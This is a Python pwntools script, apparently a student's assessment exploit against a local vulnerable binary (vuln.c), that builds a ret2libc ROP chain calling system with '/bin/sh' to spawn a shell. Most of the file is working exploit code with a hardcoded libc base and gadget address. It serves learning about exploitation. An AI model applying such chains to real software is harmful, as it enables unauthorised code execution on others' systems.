# Python program to exploit vuln.c for Assessment 2

# Will most likely use a ROP/ret2libc method. (as NX protected)

# Need to decide what vulnerability to exploit.  
# Some options:
# - Call a hidden function (maybe too trivial though)
# - Call /bash/sh - reverse TCP but locally to prove functionality
#      but not worry about needing to submit code that needs 
#      modifying to run.
# - ret2libc and ROP with ASLR and NX enabled?


# To Do before submitting:
# - Insert original Assembly in Python script as comments.
# - Explain method being used and instructions for use.
# - Ensure all code is commented with an explanation of its purpose.
# - GOT and PLT usage explained
# - Explain how vuln.c was compiled, security features etc.
# - If going to use PWNTOOLS, include info on install.

# Questions to answer
# - Will memory addresses of system ROP Gadgets be the same 
#      between systems - since we know the base system?
# - Can I use pwntools for this? Brief doesn't say I can't, and can
#      change this script to execute independently. (instead of called via .txt)

#!usr/bin/python3
import time
from pwn import *
from struct import pack

# Test program

p = process('./vuln')                               # Execute the vulnerable binary

input('Attach GDB and press enter')                 # Let user attach to gdb - remove?

binary = ELF('./vuln')                              # load the binary into pwntools
context.binary = binary                             # configure pwntools settings to match binary
rop = ROP(binary)                                   # Will help look for gadgets and building rop chains
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')   # Location of our libc library (NOTE, could be different between installs)
time.sleep(0.5)
p.recvuntil(b"buffer:")                              # Stop when program outputs this string

offset = 64                                         # Found using cyclic 200 and qaaaraaa search.  This is RBP.

#rop.raw(b"A"*offset)
#rop.raw(pack("<I",0xdeadbeef))                     # Test value
libc.address = 0x00007ffff7dc4000                   # taken from the ldd command
rop.raw(b"A"*offset)
rop.raw(0x404028)                                   # Location of pop_rdi gadget
rop.raw(next(libc.search(b'/bin/sh')))
rop.raw(libc.symbols['system'])


p.sendline(rop.chain())                             # Send our ROP objects
p.interactive()                                     # Allow user interaction


